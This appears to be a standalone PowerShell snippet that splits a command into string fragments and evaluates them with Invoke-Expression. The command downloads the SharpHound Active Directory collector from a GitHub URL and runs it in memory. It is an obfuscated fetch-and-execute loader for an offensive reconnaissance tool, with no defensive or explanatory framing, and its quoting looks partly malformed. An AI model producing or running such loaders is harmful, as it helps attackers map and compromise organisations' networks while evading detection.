$pre = '[ScriptBlock]::Create('
$mid = '" . (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/refs/heads/master/Collectors/SharpHound.ps1'')"'
$post = ')'
$sb = Invoke-Expression ($pre + $mid + $post)
& $sb
